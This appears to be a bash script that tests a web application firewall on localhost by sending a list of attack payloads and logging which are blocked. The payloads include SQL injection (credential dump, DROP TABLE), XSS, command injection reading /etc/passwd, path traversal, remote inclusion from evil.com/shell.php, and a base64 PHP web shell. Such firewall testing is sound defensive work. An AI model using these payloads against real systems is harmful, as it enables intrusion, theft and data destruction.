#!/bin/bash

# Web Application Firewall Test Script
# This script tests various attack vectors against a WAF-protected web application

TARGET_URL="http://localhost:8080/vulnerable-app.php"
OUTPUT_DIR="results"
LOG_FILE="$OUTPUT_DIR/attack-results.log"

# Create output directory
mkdir -p "$OUTPUT_DIR"
# Clear previous log
> "$LOG_FILE"

# Log function
log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" | tee -a "$LOG_FILE"
}

# Test function with color output
test_attack() {
    local attack_name="$1"
    local payload="$2"
    local full_url="$TARGET_URL?$payload"
    
    log "Testing $attack_name attack..."
    log "Payload: $payload"
    
    # Send the request and capture the response
    local response=$(curl -s -o "$OUTPUT_DIR/$attack_name.html" -w "%{http_code}" "$full_url")
    
    # Check if the attack was blocked (403 Forbidden)
    if [[ "$response" == "403" ]]; then
        log "✅ BLOCKED - Attack was successfully blocked by WAF (HTTP $response)"
    else
        log "❌ FAILED - Attack was not blocked (HTTP $response)"
    fi
    
    log "Response saved to $OUTPUT_DIR/$attack_name.html"
    log "------------------------------------------------------------"
}

log "Starting WAF testing at $(date)"
log "Target URL: $TARGET_URL"
log "------------------------------------------------------------"

# SQL Injection Tests
test_attack "sql-union" "id=1+UNION+SELECT+username,password+FROM+users"
test_attack "sql-error" "id=1'%20OR%201=1--"
test_attack "sql-blind" "id=1+AND+SLEEP(5)"
test_attack "sql-batch" "id=1;DROP+TABLE+users"

# XSS Tests
test_attack "xss-basic" "input=<script>alert('XSS')</script>"
test_attack "xss-attr" "input=\"><script>alert('XSS')</script>"
test_attack "xss-event" "input=onmouseover=alert('XSS')"
test_attack "xss-encoded" "input=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E"

# Command Injection Tests
test_attack "cmd-basic" "cmd=ls;cat+/etc/passwd"
test_attack "cmd-blind" "cmd=ping+-c+5+8.8.8.8"
test_attack "cmd-chain" "cmd=ls+%26%26+id"
test_attack "cmd-backtick" "cmd=`id`"

# Path Traversal Tests
test_attack "path-traversal-basic" "file=../../../etc/passwd"
test_attack "path-traversal-encoded" "file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
test_attack "path-traversal-null" "file=..%00/..%00/..%00/etc/passwd"
test_attack "path-traversal-win" "file=..%5c..%5c..%5cwindows%5cwin.ini"

# Local File Inclusion Tests
test_attack "lfi-basic" "page=../../../etc/passwd"
test_attack "lfi-null" "page=../../../etc/passwd%00"
test_attack "lfi-filter-bypass" "page=....//....//....//etc/passwd"

# Remote File Inclusion Tests
test_attack "rfi-basic" "page=http://evil.com/shell.php"
test_attack "rfi-protocol" "page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"

log "Testing completed at $(date)"
log "Results saved to $LOG_FILE"